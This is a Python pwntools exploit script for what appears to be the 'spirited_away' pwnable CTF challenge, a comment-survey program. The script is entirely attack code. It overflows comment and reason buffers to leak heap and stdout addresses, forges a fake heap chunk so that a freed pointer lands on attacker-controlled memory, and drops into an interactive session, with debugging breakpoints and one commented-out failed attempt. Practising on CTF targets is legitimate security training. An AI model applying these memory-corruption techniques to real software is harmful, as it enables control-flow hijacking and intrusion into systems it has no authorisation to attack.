from pwn import *
import pdb


def set_name(name):
    p.sendlineafter('Please enter your name: ', name)


def set_age(age):
    p.sendlineafter('Please enter your age: ', str(age))


def set_reason(reason):
    p.sendlineafter('Why did you came to see this movie? ', reason)


def set_comment(comment):
    p.sendlineafter('Please enter your comment: ', comment)


def set_all(name, age, reason, comment):
    set_name(name)
    set_age(age)
    set_reason(reason)
    set_comment(comment)


def do_again():
    p.sendlineafter('Would you like to leave another comment? <y/n>: ', 'y')


def free(reason, addr):
    set_all('helo', 28, reason, p32(addr))
    do_again()


def leak_heap():
    set_all('helo', 28, '1', 'b' * 0x50 + '\x10\x10\x10')
    p.recvuntil('Comment: ', drop=True)
    p.recv(0x50 + 0x4)
    name_addr = u32(p.recv(4))
    do_again()
    return name_addr


def leak(offset):
    set_name('helo2')
    set_reason('a' * (offset - 1))
    set_comment('b' * 0x50 + '\x10\x10\x10')
    p.recvuntil('Comment: ', drop=True)
    p.recv(0x50 + 0x8 + offset)
    cont = p.recvline()[:-1]
    do_again()
    return cont


def send_payload(payload):
    set_name('payload')
    set_reason('a' * 0x48 + p32(0) + p32(0x21))
    set_comment(payload)
    do_again()


elf = ELF('/home/len/pwnable/spirited_away')
p = process('/home/len/pwnable/spirited_away')
read_got = elf.got['read']

if __name__ == '__main__':
    # pdb.set_trace()
    for i in range(100):
        set_all('helo', 28, '1\x00', 'b')
        do_again()

    pdb.set_trace()

    heap_addr = leak_heap()
    print('heap_addr: {:#x}'.format(heap_addr))

    cont = leak(0x28)
    stdout_addr = u32(cont[:4])
    print('stdout_addr: {:#x}'.format(stdout_addr))

    cont = leak(0x38)
    addr = u32(cont[:4])
    comment_addr = addr - 200
    reason_addr = comment_addr + 0x50 + 0x8
    print('addr: {:#x}'.format(addr))
    print('comment_addr: {:#x}'.format(comment_addr))

    # not work
    # fake_chunk_addr = reason_addr
    # fake_chunk = p32(0x20) + p32(0x49) + 'c' * 0x8

    # print('fake_chunk_addr: {:#x}'.format(fake_chunk_addr))
    # payload = 'b' * 0x4f + p32(28) + p32(fake_chunk_addr + 8) + fake_chunk
    # pdb.set_trace()
    # send_payload(payload)

    fake_chunk_addr = heap_addr
    print('fake_chunk_addr: {:#x}'.format(fake_chunk_addr))
    fake_chunk = p32(0) + p32(0x51) + 'a' * 0x40 + 'b' * 0x7

    payload = fake_chunk + p32(0x50) + p32(0x20001)

    set_name(payload)
    set_reason('1')
    pdb.set_trace()
    set_comment('c' * 0x50 + p32(28) + p32(fake_chunk_addr + 8))

    do_again()
    p.interactive()
'''
survey
0xfff7ed60

0xfff7eda0
'''